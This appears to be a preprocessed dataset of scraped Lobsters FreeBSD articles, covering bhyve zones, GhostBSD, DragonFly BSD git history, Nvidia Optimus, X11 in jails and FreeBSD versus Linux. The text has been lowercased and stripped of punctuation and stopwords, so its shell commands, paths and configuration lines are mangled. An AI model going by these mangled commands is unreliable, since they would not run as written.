bootonlyiso create zone via zonecfg always recommend create one file contains relevant data zonecfg work correctly example tmpgwzone create b set brandbhyve set zonepathzonesgw add net set set end add device set end add device set end add f set dirrpoolisofreebsdiso set specialrpoolisofreebsdiso set typelofs add option ro add option nodevices end add attr set namecdrom set typestring set valuerpoolisofreebsdiso end add attr set namebootrom set typestring set valuebhyverelease end add attr set namebootdisk set typestring set end add attr set nameextra set typestring set value passthru end everything related freebsdiso removed later need install medium anymore bhyverelease bootrom required freebsd work correctly might depends operating system one need use following two setting required get passthrough working correctly add device zone allow required access add device set end add extra parameter bhyve command passthrough correctly pci id guest pci id chosen long used parameter already add attr set nameextra set typestring set value passthru end required disallow guest memory swapped otherwise passthrough nt supported finish configuration creating zone zonecfg z gw f tmpgwzone use zoneadm install boot zone zoneadm z gw install zoneadm z gw boot something going wrong zone nt boot correctly check bhyve log file zonepathroottmpinitlog example zonesgwroottmpinitlog configure freebsd bhyve guest able log zone via zlogin follow operating system installation based need awesome freebsd installation straightforward anyway installation network configuration required support wireless card setup nat modify bootloaderconf load correct firmware ifiwnload yes yes yes wlanwep yes wlanccmpload yes wlantkipload yes setup network interface via etcrcconf check guest ethernet interface inet netmask wireless network interface wpa country de enable pf ip forwarding gatewayenable yes pfenable yes add nat entry etcpfconf nat configure wireless network required use wpasupplicant store information etcwpasupplicantconf wpapassphrase ssid pwd etcwpasupplicantconf reboot might required load required firmware configure network described test network configuration global zone able ping bhyve guest via nt configured default gateway yet might good time route add default able reach network always loved internet via awesome bhyve router
118,Lobsters,freebsd,FreeBSD,Ars Technica - Not Actually Linux Distro Review - GhostBSD,https://arstechnica.com/gadgets/2020/04/not-actually-linux-distro-review-deux-ghostbsd/,ar technica actually linux distro review ghostbsd,enlarge freebsd review ghostbsd history trueos ixsystems freenas project trident rebased void linux furybsd midnightbsd desktopbsd ghostbsd live installation environment ncurses mate installation first boot finding missing bit quick look ghostbsd control center conclusion good bad ugly,enlarge interested bsd experience want easier directtothedesktop experience ghostbsd covered screenshot ghostbsd live desktop graphical installation environmentjim salter began work freebsd review last week nt take long figure desktop portion nt going smoothly think important bsdcurious user know easier gentler alternative little looking around settled ghostbsd followup review history ghostbsd based trueos derives freebsd stable originally canadian distro successful transcended country origin considered worldwide significant ghostbsd development take place canada italy germany united state history desktoporiented bsd distros turbulent one several year kris moore pcbsd goto want bsd also want readytogo desktop eventually freenas storage distro company moore vice president engineering rely heavily serverside feature developed pcbsd need ixsystems foundation pcbsd without associated desktop led rename fork pcbsd underpinnings became trueos desktopfriendly based project trident state affair nt last long year later project trident declared unhappiness trueos bsd due hardware support lack thereof january trident rebased void linux developer found bsdlike potential linux upstream distros examined project trident departure linuxy water left several potential contender desktopfocused bsd distribution include furybsd midnightbsd desktopbsd ghostbsd tested pcbsd fairly extensively past history current desktop bsd choice chose ghostbsd first look solely due prominence google search result desktop bsd distro live installation environment ghostbsd start nice bsdstyle ascii splash menu jim salter next menu allows pick gpu video driver configuration vm picked vesa jim salter selecting vesa video fully functional live desktop two second le jim salter ghostbsd installation process pretty radical departure freebsd although underlying root still defaulting selecting multiuser boot user presented ncurses ascii menu allowing x graphical display server configuration bit shame installer nt yet capable simply autodetecting graphic environment way typical linux installers fair manual selection could also make thing easier slightly wonky option fallback simple vesa mode staring right face try direct intelamdnvidia driver fail installation virtual machine selected vesa two second le hitting enter fully functional matebased live desktop running link installer script prominently placed desktop nt mess around live doubleclicked installer immediately installation ghostbsd installer like freebsd offer chance zfs multipledisk topology jim salter ghostbsd nt offer fake vdev picked single mirror add second two disk pool installation jim salter ghostbsd nt pretend real user account optional required create one process short sweet jim salter disk configuration user setup complete race jim salter ghostbsd missed minor lick installation completes nt ask u reboot dump u unceremoniously back desktop jim salter ghostbsd installation process tremendously straightforward freebsd doubleclicking installer asked select disk configuration like freebsd offered chance zfs root setup including multiple disk topology mouse reason extremely unresponsive erratic menu required significant patience probably artifact vm installation strongly suspect would issue bare metal option given little different freebsd instead telling little white lie vdev ghostbsd asked select pool type option available single disk two disk mirror three disk similar stripe single parity four five disk similar stripe dual parity disk stripe force zfs block size optional checkbox made sure selected disk advanced format sector size disk zfs installs sector performance bad unfortunately nt seem checkbox setting actually later although wanted pool mirror eventually one twodisk mirror fine moment selected single twodisk mirror plan zpool add remaining two disk another mirror vdev installation completed disk configuration complete ghostbsd asked create user account present optional process nt drag process either hostname friendly username real username password default shell configured single screen along password strength identifier default shell offered nt know fish left asis get normal outofbox experience like every password strength identifier one ghostbsd user setup screen pretty informed strong password oh well machine named nice strong password entered ghostbsd got process installing installation take long although general simple easy friendly setup experience ghostbsd installer dropped minor note end installer finished dumped back desktop without offering without letting know need reboot order get freshly installed system nt likely throw many people actually interested trying bsd easy paper cut fix first boot rebooting brings fresh new mate environment although something missing jim salter installed firefox using pkg terminal nt show still nt figured missing browsed usrlocalbin jim salter confirmed firefox rightclicked empty spot desktop create launcher jim salter tada got launcher firefox desktop firefox jim salter first boot new ghostbsd system bit mixed bag ghostbsd booted rapidly got right desktop application also popped open instantly none freebsd feeling lag sluggishness question application launcher nt realize yet top mate panel crashed leaving blank black bar behind empty black panel blended default background well enough spent confused first minute thinking system bit primitive side rightclicking empty area desktop offered open terminal option context menu although using fish unfamiliar shell nt get delete key nt beeping tilde machine like freebsd version sh basic functionality one would expect shell intact became root su command sudo also preinstalled available ghostbsd stumbling install pkg add firefox command line went exactly rapidly ghostbsd us pkgusghostbsdorgstable preconfigured plenty bandwidth available firefox icon desktop pkg finished thing still nt twigged crashed mate top panel rightclicked desktop create launcher another context menu option browsed usrlocalbin shiny new firefox icon desktop firefox application launch snappy unlike experience freebsd fact firefox launched ghostbsd bit quicker host operating system ubuntu finding missing bit eventually realized something seemed blank black bar top desktop crashed panel jim salter firefox available userfriendly way pkg application inside crashed mate panel nt recognized jim salter diving back terminal add second two disk pool unfortunately also notice ghostbsd nt live promise use sector jim salter still frustrated primitive everything seemed however snappy surely everything nt need done hand like system guibased package selection system volume control forth finally spotted small black area top desktop rightclicked produced new context menu importantly including reset panel oh hey missing functionality panel reset obvious procedure supposed new user able click application menu go internet find firefox singleclick open firefox panel rightclick offer option create new launcher either desktop top panel also missing tool like system information volume control forth lurking ghostbsd suddenly felt lot needed one shrewd kick get going everything working properly next dove back mate terminal add remaining pair disk checked ashift zfs property defines minimum block size disk unfortunately despite made certain force zfs block size option checked installation discovered ashift set sector snappy ghostbsd felt far would even better using correct hardware blocksize like asked fortunately vm underlying storage fast solid state pool omission nt made thing painful unfortunately ashift immutable set sighed zpool add tank mirror get remaining pair virtual disk added pool went way disk sector size issue would much bigger problem real life nt worth derailing vm test quick look ghostbsd control center ghostbsd control center offer link administrative task printing audio software installation jim salter software station ghostbsd graphical package manager functional primitive desktop ca nt resize overwide column jim salter software station organized category freebsd veteran immediately recognize port tree found gimp graphic checked clicked apply install jim salter muchtoounderstated progress bar bottom show u progress installing gimp jim salter ghostbsd mate control center quite pleasant modern one unfortunate exception software station ghostbsd guibased package management app nt want oversell software station problem perfectly functional although bit primitive could use considerable amount developer love particular desperately need resizable column software station broken category veteran freebsd user immediately recognize port tree package information broken fixedwidth one package name version size significantly wider necessary result little package description visible without scrolling horizontally right package name column littered name like eflite forth name must brief command line management wo nt mean much new many wellestablished user scrolling horizontally way right read friendly package description turn hide everything version number size fair vm resolution would absurdly low bare metal much data would visible without scrolling full desktop hand budget laptop display would nearly cramped one adding insult injury ghostbsd vesa driver would nt let choose higher resolution would nt likely issue real would nt issue typical linux vm either conclusion ghostbsd perfectly reasonable choice desktop distribution still lag behind mainstream linux counterpart one two place nt discover real showstopper wtfs obvious performance issue ghostbsd might fact little snappier ubuntu host operating system virtualized audio worked box firefox installed youtube video played well google chrome still going nogo least without truly herculean effort search chrome installation story found ca nt bsd answer wo nt matter youtube present significant stumbling block user need chrome plugins streaming website depend proprietary chrome feature liked ghostbsd zfs installer dialog much better deeply disappointed failure honor force zfs block size checkbox would major stumbling block source performance problem real installation real hardware disk truthfully report block size zfs honor like samsung pro ssds workstation lie teeth claim byte sector legacy window xp would cough hairball presented disk hardware blocksize byte veteran zfs user could likely work around block size issue nt test specifically relatively simple pull terminal pool creation installation destroy pool ghostbsd created replace new one proper ashift setting absent specific desire bsd hood tough time recommending ghostbsd place one mainstream linux distribution pretty high bar hurdle would issue recommending ghostbsd one new unixlike operating specifically want bsdbased desktop wart found ghostbsd eminently fixable polish clearly important community dev team suspect majority issue discovered review fixed next release good ghostbsd installer pleasant efficient mostly modern mate environment wellfleshed functional environment feel quick snappy without lag sluggishness going zero desktop possible even new user bad polished ghostbsd still lag behind mainstream linux counterpart support proprietary userfocused software like chrome effectively nonexistent new user nt already bsd friend tougher time finding support ugly crashed mate top panel first boot incorrect zfs blocksize despite checkbox corrected software station primitive difficult navigate modern standard
119,Lobsters,freebsd,FreeBSD,DragonFly BSD Source Code Full History,https://www.dragonflybsd.org/docs/developer/dfly_source_full_history/,dragonfly bsd source code full history,dragonfly bsd source code full history git repository leaf github obtain grafted history gitreplace first commit readme blame example leaf grafted history created svn git note graft commit create history repository graft commit graft history dragonfly bsd repository reference,dragonfly bsd source code full history author aaron li current dragonfly bsd git repository code history since fork freebsd history fork get full code history picked freebsd code history dragonfly bsd fork commit separate git repository grafted official dragonfly bsd code repository see detail pushed grafted history dragonfly bsd repository leaf github easier use others obtain grafted history get grafted history dragonfly bsd repository git remote add aly http githubcomliweitianuxdragonflybsdgit git fetch aly refsreplace refsreplace done prefer repository leaf server use git remote add aly git leafdragonflybsdorgalydragonflygit extends dragonfly bsd source code history commits freebsd epoch freebsd source method employed gitreplace dragonfly bsd first commit replaced historical commits freebsd source repository fact first commit really get modified interpreted differently git commits dragonfly bsd repository remain intact ie hash nt change regard grafted history separate branch use repository usual use grafted history example git log oneline wc l would without grafted history git blame readme sascha wildner top level dragonfly source directory sascha wildner jkh copyright information please see file copyright jkh directory additional copyright information also exists jkh source tree please see specific source directory jkh information jkh jkh makefile directory support number target jeroen ruigrokasmodai building component dragonfly source tree sascha wildner commonly used buildworld installworld rebuild sascha wildner install everything dragonfly system source tree sascha wildner except kernel kernelmodules content etc alex buildkernel installkernel target build install alex kernel module see please see top alex makefile directory information alex standard build target compiletime flag alex jeroen ruigrokasmodai building kernel somewhat involved process documentation jeroen ruigrokasmodai found matthias schmidt http wwwdragonflybsdorgdocshandbook sascha wildner also see build config man page jeroen ruigrokasmodai alex note want build install kernel bmah buildkernel installkernel target might need build sascha wildner world information available dragonfly handbook jkh aaron li kernel configuration file reside sysconfig subdirectory aaron li default kernel configuration used aaron li release build default bit vkernel kernel aaron li configuration file file contains entry possible aaron li device commonly used meant general aaron li reference actual kernel configuration file kernel built aaron li would nt even run also see config man page jkh jkh jkh source roadmap jkh bmah bin systemuser command jkh jkh contrib package contributed party jkh alex crypto cryptography stuff see cryptoreadme jkh aaron li doc documentation dragonfly bsd aaron li bmah etc template file etc jkh jkh game amusement jkh jkh gnu various command library gnu public license jkh please see gnucopying information jkh jkh include system include file jkh jkh lib system library jkh jkh libexec system daemon jkh jeroen ruigrokasmodai nrelease framework building live cd image jeroen ruigrokasmodai aaron li initrd build system statically linked rescue utility aaron li initial ramdisk creation aaron li jkh sbin system command jkh jkh share shared resource jkh jkh sys kernel source jkh jeroen ruigrokasmodai test system test jeroen ruigrokasmodai jkh tool utility regression testing miscellaneous task jkh jkh usrbin user command jkh jkh usrsbin system administration command yes see detailed change made see also readme blame example leaf grafted history created dragonfly bsd forked freebsd following commit branch date jun author hmp log mfc rev url svn git note dragonfly bsd git repository converted cv however perfect example many file renamesmoves properly tracked cv keyword freebsd expanded freebsd git repository therefore dragonfly bsd source code first commit exact copy freebsd code fork commit extra graft commit required concatenate two end create history repository git clone branch http githubcomfreebsdfreebsd cd git reset hard fork commit git init bare dragonflybsdhistorygit git push dragonflybsdhistorygit master cd git clone dragonflybsdhistorygit git clone http githubcomdragonflybsddragonflybsd dragonflybsd cd dragonflybsd firstcommit git revlist reverse head head n git checkout firstcommit cd dragonflybsdhistory rm rf cp dragonflybsd git config diffrenamelimit git add git commit create graft commit see also graft commit graft history dragonfly bsd repository cd dragonflybsd git remote add history dragonflybsdhistorygit git fetch history graftcommit git revparse verify historymaster firstcommit git revlist reverse head head n git replace firstcommit graftcommit reference
120,Lobsters,freebsd,FreeBSD,FreeBSD and Nvidia Optimus,http://alfix.gitlab.io/bsd/2020/01/05/freebsd-and-nvidia-optimus.html,freebsd nvidia optimus,screenshot freebsd freebsd foundation nvidia optimus nvidia corporation step optimus graphicsdrmcurrentkmod instruction step step step gamestriggerrally http triggerrallysourceforgenet screenshot step step pouyaeghbalifreebsdnvidiaoptimus pr freebsd forum nvidia optimus driver freebsd freebsd wiki tuningpowerconsumption,post step step tutorial describe use nvidia geforce graphic card freebsd laptop screenshot freebsd registered trademark freebsd foundation nvidia optimus registered trademark nvidia corporation step assume using freebsd nvidia optimus graphic card laptop time writing freebsd version uname freebsd fbsdhome freebsd generic use intel video card installing graphicsdrmcurrentkmod may need install following instruction port editing section device extra section device available driver option value integer f float bool true false string string freq f hzkhzmhz percent f arg arg optional option shadowfb bool option defaultrefresh bool option modesetclearscreen bool identifier driver intel busid endsection section device available driver option value integer f float bool true false string string freq f hzkhzmhz percent f arg arg optional option shadowfb bool option defaultrefresh bool option modesetclearscreen bool identifier driver vesa busid endsection extra step install nvidia driver optirun utility git clone http githubcompouyaeghbalifreebsdnvidiaoptimusgit cd freebsdnvidiaoptimus sudo mkdir sudo cp pr nvidiaoptimusdriver sudo mkdir sudo cp pr cd sudo make install clean installed legacy version could install latest version cd sudo make install clean finally may need run step start optimus service sudo usrlocaletcrcdoptimus onestart output sudo usrlocaletcrcdoptimus onestart starting optimus xorg x server release date x protocol version revision build operating system freebsd current operating system freebsd fbsdhome freebsd generic build date september current version pixman reporting problem check http wikixorg make sure latest version marker probed config file default setting command line notice ii informational ww warning ee error ni implemented unknown log file time sun jan using config file using system config directory command could lock shell problem type enter key shell ready run command step install gamestriggerrally http triggerrallysourceforgenet run play close game output show graphic intel open source technology center mesa dri intel r ironlake mobile using opengl mesa run close game finally see graphic nvidia corporation geforce gt using opengl nvidia alike could install gamessauerbraten info graphic card topleft corner starting screen screenshot step enjoy screenshot step github project pouyaeghbalifreebsdnvidiaoptimus freebsd port work progress pr problem troubleshoot freebsd forum nvidia optimus driver freebsd switch nvidia optimus card freebsd wiki tuningpowerconsumption
121,Lobsters,freebsd,FreeBSD,Running X11 Applications on Jail Created with Bastille,https://genneko.github.io/playing-with-bsd/application/running-xapps-on-a-jail/,running application jail created bastille,running x application jail created bastille assumption graphical desktop workstation post bastille getting started bastille guide problem inkscape graphicsinkscape solution configuration afterwords reference revision history,running x application jail created bastille freebsd jail often talked security system administration perspective although perfectly valid point view jail also used purpose fact recently benefited jail situation convinced jail really awesome made write short article assumption host graphical desktop workstation running freebsd zfs usually create jail procedure described post short using standard tool time used bastille shellbased lightweight jail manager quickly setup jail bastille installed configured ready use pf firewall host also setup allow translate nat traffic jail see official getting started bastille guide detail configure bastille data directory bastilleprefix set vmbastille personal preference username host genneko user id uid host running sshd client machine use sudo perform privileged operation host login jail root problem wanted use inkscape vector drawing application install graphicsinkscape package depends existing apps require imagemagick version conflict installed system solution jail file directory regarded separate system host install package jail without worrying conflict package installed host although jail monitor x application like inkscape display window x server running host thanks clientserver nature x window system configuration think several combination jail type shared vnet network configuration address assignment bridgedrouted etc pick one standard jail address dedicated loopback interface host create jail name xapp sudo bastille create xapp add jail addresshostname etchosts host jail sudo sh c echo xapp etchosts sudo sh c echo xapp vmbastillejailsxapprootetchosts start jail sudo bastille start xapp login jail sudo bastille console xapp configure jail inside add user run inkscape would convenient create user uid host user pw useradd n genneko u passwd genneko install xauth inkscape dependency xauth required forwarding pkg install xauth inkscape configure start ssh server jail required localhost standard nonvnet jail seem true localhost although sure explain detail confirmed least required vnet jail network stack true localhost sysrc sshdenable yes echo etcsshsshdconfig service sshd start exit jail exit back host use ssh run inkscape jail flag enables trusted forwarding c enables compression ssh cy xapp inkscape yay made quitted inkscape noticed following warning terminal gdkwarning shmget failed error function implemented gtkwarning attempting store change homegennekolocalsharerecentlyusedxbel failed failed create file file directory gtkwarning attempting set permission homegennekolocalsharerecentlyusedxbel failed file directory first warning coped allowing jail access sysv shared memory primitive open jail configuration editor running either sudo bastille edit xapp sudo vi vmbastillejailsxappjailconf add following line xapp section restart jail sudo bastille restart xapp sysvshm new second third warning suppressed creating directory mentioned message jail filesystem mkdir p vmbastillejailsxapproothomegennekolocalshare afterwords learned really easy install x application jail use host x application xfig xterm chromium firefox also run manner got another reason love freebsd jail real jail course p reference revision history
122,Lobsters,freebsd,FreeBSD,Technical Reasons to Choose FreeBSD over GNU/Linux,https://unixsheikh.com/articles/technical-reasons-to-choose-freebsd-over-linux.html,technical reason choose freebsd gnulinux,technical reason choose freebsd gnulinux table content introduction part part clean separation debian way init command script sysctl system configuration absolute freebsd documentation freebsd handbook security absolute freebsd security installtime option vulnerability statistic freebsd linux stability port collection freebsd port collection pkgsrc package source port collection pkg rolling release package poudriere freebsd jail zfs zfs boot environment bectl bsd init init rc wikipedia jail jail setting record straight container v zone v jail v vms iocage bastille bastille capsicum university cambridge computer laboratory dtrace dtrace dtrace oneliner tutorial dtrace example dtrace linux bhyve firewall firewall dummynet tuning sysctl geom geom linux binary compatibility security event auditing final note problem micro editor patreon,technical reason choose freebsd gnulinuxposted last updated wrote article migrate everything linux bsd wanting write something technical reason choose freebsd gnulinux possibly cover every single reason write thing consider worth noting table content introduction previous article migrate everything linux bsd part part addressed political problem going gnulinux believe issue important reason consider migrating gnulinux bsd also exist technical reason consider clean separation way freebsd designed different component put together deal configuration tuning tool developed improved cause many year working freebsd something special gnulinux distribution worked since get feeling mismatch example debian gnulinux debian way thing debian way represented usage specific set configuration management tool patch make third party software conform debian way setting thing sense unify thing debian distribution breaking upstream configuration make annoying deal especially problem something nt working right way thing described upstream documentation nt match setup debian another problem approach third party software even core element distribution systemd forcefully shaped debian way result system part running debian way part debian gnulinux adopted systemd yet time default networking part debian specific sometimes disable remove debian specific thing get systemd specific thing work distribution like arch linux problem nt exist nt thing arch way arch linux distribution want third party software upstream made change anything unless absolutely necessary great mean upstream documentation match software problem approach however third party software handle thing differently end system thing nt running unified yet personally still much prefer arch linux debian regard system administration debian sometimes almost butcher third party software ubuntu even worse based upon debian run lot debian tooling setup yet time also ubuntu way thing changed debian added layer top socalled user improved tooling layer sometimes make ubuntu break incomprehensible way freebsd one thing notice right away dealing system put together well kernel base system completely separated third party application base system configuration go etc third party configuration go usrlocaletc everything configure everything tune setup well documented man page everything rc utility command script control automatic boot process called init command script sysctl kernel management tool different system configuration everything else put together well well documented know exactly express freebsd managed way complete operating system project bunch different project glued together distribution everything wellthoughtout based upon many year experience thing change change better entire community lot feedback real use case problem industry one best way really understand read michael w lucas book absolute freebsd manages greatly explain describe technical issue book deal also capture important historical context thing exactly way documentation people nt consider documentation part technical reason use something documentation belongs integrate part technology describes bad documentation outdated documentation missing documentation considered bug freebsd documentation shipped system nt search web man page base system excellent quality specifically written freebsd need right system freebsd also freebsd handbook cover installation day day use freebsd freebsd handbook installed locally installation handbook occasionally outdated section book result ongoing work many individual generally updated well written security normally operating system get compromised program running operating system situation compromised program interact operating system way also compromise operating system securing operating system mean try ensure computer resource used authorized people authorized purpose freebsd undergone thorough auditing order eliminate buffer overflow well myriad security issue furthermore freebsd provides many tool option help secure system attacker impossible provide exhaustive list option available feature article subject security freebsd could easily fill book highly recommend michael w lucas book absolute freebsd want indepth study security feature freebsd provides however mention couple thing security installtime option installation freebsd installer provides nice set option enable disable hiding uids process hiding gids process hiding jailed process hide message buffer disable process debugging randomize process id disable syslogd networking disable sendmail secure console non executable stack stack guard freebsd kernellevel security setting available securitybsd sysctl tree get added every month run sysctl securitybsd display available option freebsd installation sysctl securitybsd securitybsd bsd security policy securitybsdstackguardpage specifies number guard page stack grows securitybsdunprivilegedgetquota unprivileged process may retrieve quota uids gids securitybsdhardlinkcheckgid unprivileged process create hard link file owned group securitybsdhardlinkcheckuid unprivileged process create hard link file owned user securitybsdunprivilegedidprio allow nonroot user set idle priority securitybsdunprivilegedprocdebug unprivileged process may use process debugging facility securitybsdconservativesignals unprivileged process prevented sending certain signal process whose credential changed securitybsdseejailproc unprivileged process may see subjectsobjects different jail id securitybsdseeothergids unprivileged process may see subjectsobjects different real gid securitybsdseeotheruids unprivileged process may see subjectsobjects different real uid securitybsdunprivilegedreadmsgbuf unprivileged process may read kernel message buffer securitybsdunprivilegedmlock allow nonroot user call mlock securitybsdsuserenabled process uid privilege securitybsdmapatzero permit process map object virtual address vulnerability statistic list vulnerability statistic freebsd linux generally lower amount security issue freebsd nt necessarily mean freebsd secure linux even though believe also lot eye linux year freebsd linux total information specific vulnerability take look cve detail website freebsd linux stability freebsd great engineering release management practice freebsd go multiple step idea inception public release someone get idea develops something new first get peer technical review enters current branch integrated testing depending complexity potential impact migration window going stable adjusted enters stable branch wider user base testing usually beta testing occurs also wider community engagement enters release candidate testing usually last round becomes normal release mean pretty confident thing going continue work provided understand release upgrading note patch software released fix vulnerability bug typically make freebsd solid operating system port collection freebsd port collection amazing feat engineering netbsd pkgsrc package source openbsd port collection trace origin freebsd port system normally install software unix operating system find download software unpack software typically tarball compressed locate documentation install readme text based document read instruction install software software distributed source format need compile normally involves editing makefile running configure script compilation successful test install software software dependency would need download install first freebsd port collection us makefiles automate process compilation installing uninstalling software make command file comprise port contain necessary information automatically download extract patch compile install application little user intervention required issuing beginning command make install make install clean port directory desired application port needed dependency application library installed beforehand automatically port configured default set option deemed generally appropriate user however one great thing port system configuration option changed installation using make config command command brings textbased interface allows user select desired option time writing port available collection case port application made available download precompiled package setup default option package installed using freebsd pkg binary package management application precompiled port called package freebsd project package build farm package supported architecture major release built build log known error port built package available database weekly build log also available mailing list archive rolling release package two different branch choose regarding package one called quarterly called latest quarterly name port branch cut head branch revision system beginning every yearly quarter january april july october name binary package set produced branch quarterly branch provides user predictable stable experience port package installation upgrade done essentially allowing nonfeature update quarterly branch aim receive security fix may also version update backports commits bug fix port compliance framework change choose latest branch freebsd becomes rolling release regard third party package much like arch linux get bleeding edge software poudriere poudriere utility creating testing freebsd package utilizes freebsd jail system set isolated compilation environment jail used build package version freebsd different system installed package built layout identical official mirror package usable freebsd pkg binary package management tool poudriere amazing tool testing building package poudriere easily build set binary package repository package build exactly specification need poudriere handle bulk building entire port tree specific subset port tree single port including dependency automatically build package generates build log file provides signed pkg repository make possible test port build submitting patch freebsd bug tracker make possible test different build using different option poudriere performs building clean jail environment capable using zfs specific feature mean pollution host environment leftover file accidental removal change existing configuration file poudriere straightforward set use dependency run supported freebsd release zfs zfs filesystem first class citizen freebsd mean possible root installed zfs installer support box also mean lot base system tool tightly integrated build support zfs running zfs freebsd different running zfs linux freebsd get tool used investigate performance issue relevant issue zfs feature zfs taken wikipedia designed longterm storage data indefinitely scaled datastore size zero data loss high configurability hierarchical checksumming data metadata ensuring entire storage system verified use confirmed correctly stored remedied corrupt checksum stored block parent block rather block contrast many file system checksum held stored data data lost corrupt checksum also likely lost incorrect store userspecified number copy data metadata selected type data improve ability recover data corruption important file structure automatic rollback recent change file system data circumstance event error inconsistency automated usually silent selfhealing data inconsistency write failure detected error data capable reconstruction data reconstructed using following error detection correction checksum stored block parent block multiple copy data including checksum held disk write intention logged slog zil writes occurred occur power failure parity data raidraidz disk volume copy data mirrored disk volume native handling standard raid level additional zfs raid layout raidz raidz level stripe data across disk required efficiency many raid system stripe indiscriminately across device checksumming allows rebuilding inconsistent corrupted data minimised block defect native handling tiered storage caching device usually volume related task zfs also understands file system use filerelated knowledge inform integrate optimize tiered storage handling separate device native handling snapshot backupreplication made efficient integrating volume file handling relevant tool provided low level require external script software utilization native data compression deduplication although latter largely handled ram memory hungry efficient rebuilding raid raid controller often rebuild entire disk zfs combine disk file knowledge limit rebuilding data actually missing corrupt greatly speeding rebuilding unaffected raid hardware change affect many system many system selfcontained raid hardware raid card fails data moved another raid system file system lack information original raid hardware needed manage data raid array lead total loss data unless nearidentical hardware acquired used stepping stone since zfs manages raid zfs pool migrated hardware operating system reinstalled raidz structure data recognized immediately accessible zfs ability identify data would found cache discarded recently instead allows zfs reassess caching decision light later use facilitates high cachehit level zfs cache hit rate typically alternative caching strategy used data would otherwise cause delay data handling example synchronous writes capable slowing storage system converted asynchronous writes written fast separate caching device known slog sometimes called zil zfs intent log highly internal parameter configured optimal functionality used high availability cluster computing although fully designed use course also get feature run zfs linux however big difference single linux distribution come even close level integration zfs freebsd boot environment due tight integration zfs freebsd also support boot environment boot environment install multiple version core operating system choose one boot boot environment bootable clone snapshot working system boot environment perform bulletproof upgrade change system nt worry breaking anything always roll back also mean update freebsd system inside new zfs boot environment without touching running system also perform upgrade test result inside freebsd jail even copy move zfs boot environment another machine freebsd bectl utility make easy manage boot environment bsd init freebsd us traditional bsdstyle init bsdstyle init runlevels etcinittab exist instead startup controlled rc script script found etcrcd application part base system cron sshd syslog etc script usrlocaletcrcd userinstalled third party application nginx postfix previously mentioned freebsd developed complete operating system userinstalled third party application part base system third party application installed using package port order keep separate base system userinstalled application installed usrlocal userinstalled binary reside usrlocalbin whereas configuration file located usrlocaletc bsd init system service enabled adding entry service etcrcconf default setting located etcdefaultsrcconf default setting overridden setting etcrcconf following entry etcrcconf enable sshd sshdenable yes manually add entry run service sshd enable automatically edit etcrcconf add entry manually start service service sshd start service enabled still want start started command line using service sshd onestart read init system wikipedia jail freebsd jail system another amazing feat engineering jail introduced freebsd version march freebsd jail oslevel virtualisation allows install freebsdderived system several independent minisystems called jail system running jail share kernel system resource result little overhead need freebsd jail came small sharedenvironment hosting provider r associate inc owner derrick woolworth desire establish clean clearcut separation service customer mainly security ease administration instead adding new layer finegrained configuration option solution developed poulhenning kamp compartmentalize system file resource way right people given access right compartment jail possible create various virtual machine set utility installed configuration make safe way try software example possible run different version try different configuration web server package different jail since jail limited narrow scope effect misconfiguration mistake even done injail superuser jeopardize rest system integrity since nothing actually modified outside jail change discarded deleting jail copy directory tree freebsd jail however achieve true virtualisation allow virtual machine run different kernel version base system freebsd jail effective way increase security server separation jailed environment rest system jail base system want better understand difference freebsd jail linux container read blog post setting record straight container v zone v jail v vms freebsd iocage tool designed simplify jail management task abstract management zfsbacked jail running vnet shared ip networking bastille bastille opensource system automating deployment management containerized application freebsd bastille us freebsd jail container platform add template automation create dockerlike collection containerized software template take care installing configuring enabling starting software providing automated way building containerized stack capsicum capsicum sandbox framework developed university cambridge computer laboratory supported grant google freebsd foundation darpa capsicum extends posix api providing several new o primitive support objectcapability security unixlike operating system capability refined file descriptor finegrained right capability mode process sandbox deny access global namespaces process descriptor capabilitycentric process id replacement anonymous shared memory object extension posix shared memory api support anonymous swap object associated file descriptor capability rtldelfcap modified elf runtime linker construct sandboxed application libcapsicum library create use capability sandboxed component libuserangel library allowing sandboxed application component interact user angel power box chromiumcapsicum version google chromium web browser us capability mode capability provide effective sandboxing highrisk web page rendering freebsd implementation capsicum developed robert watson jonathan anderson ship box freebsd capsicum freebsd reference implementation serf reference capsicum apis semantics also provides startingpoint source code port platform eg capsicum linux capsicum dragonflybsd information capsicum freebsd please see dtrace dtrace comprehensive dynamic tracing framework ported solaris dtrace provides powerful infrastructure permit administrator developer service personnel concisely answer arbitrary question behavior operating system user program dtrace provide global overview running system amount memory cpu time filesystem network resource used active process dtrace also provide finegrained information log argument specific function called list process accessing specific file information dtrace usage see dtrace oneliner tutorial dtrace example also interesting discussion many relevant comment hacker news dtrace linux bhyve bhyve native freebsd hypervisor run guest operating system inside virtual machine parameter number virtual cpu amount guest memory io connectivity specified commandline parameter bhyve support virtualisation several guest operating system including freebsd openbsd netbsd linux illumos dragonfly window vista later window server later current development effort aim widening support operating system architecture bhyve hypervisor became part base system freebsd bhyve requires processor support intel extended page table ept amd rapid virtualization indexing rvi nested page table npt hosting linux guest freebsd guest one vcpu requires vmx unrestricted mode support ug newer processor specifically intel core intel xeon support feature ug support introduced intel westmere microarchitecture firewall firewall freebsd three different firewall built base system pf ipfw ipfilter also known ipf since freebsd ported version openbsd pf firewall included integrated part base system pf complete fullfeatured firewall optional support altq alternate queuing provides quality service qos filtering syntax pf similar ipf modification make clearer network address translation nat quality service qos integrated pf qos importing altq queuing software linking pf configuration feature pfsync carp failover redundancy authpf session authentication ftpproxy ease firewalling difficult ftp protocol also extended pf also pf support smp symmetric multiprocessing sto stateful tracking option one many innovative feature pf logging pf logging configurable per rule within pfconf log provided pf pseudonetwork interface called pflog way lift data kernellevel mode userlevel program log may monitored using standard utility tcpdump ipfw stateful firewall written freebsd support consists several component kernel firewall filter rule processor integrated packet accounting facility logging facility nat dummynet traffic shaper forward facility bridge facility ipstealth facility freebsd provides sample ruleset etcrcfirewall defines several firewall type common scenario assist novice user generating appropriate ruleset ipfw provides powerful syntax advanced user use craft customized rulesets meet security requirement given environment ipf crossplatform open source firewall ported several operating system including freebsd netbsd openbsd solaris ipf kernelside firewall nat mechanism controlled monitored userland program firewall rule set deleted using ipf nat rule set deleted using ipnat runtime statistic kernel part ipf printed using ipfstat ipmon used log ipf action system log file ipf originally written using rule processing logic last matching rule win used stateless rule since ipf enhanced include quick keep state option tuning freebsd five hundred system variable read set using sysctl utility system variable used make change running freebsd system includes many advanced option tcpip stack virtual memory system dramatically improve performance experienced system administrator geom freebsd geom main storage framework freebsd operating system provides standardized way access storage layer geom modular allows geom module connect framework example geommirror module provides mirroring functionality system number module already available new one always active development various freebsd developer geom modular design module stacked together form chain geom layer example top geommirror module encryption module added geomeli provide mirrored encrypted volume module consumer provider provider source geom module often physical hard drive sometimes virtualized disk memory disk geom module turn provides output device geom module called 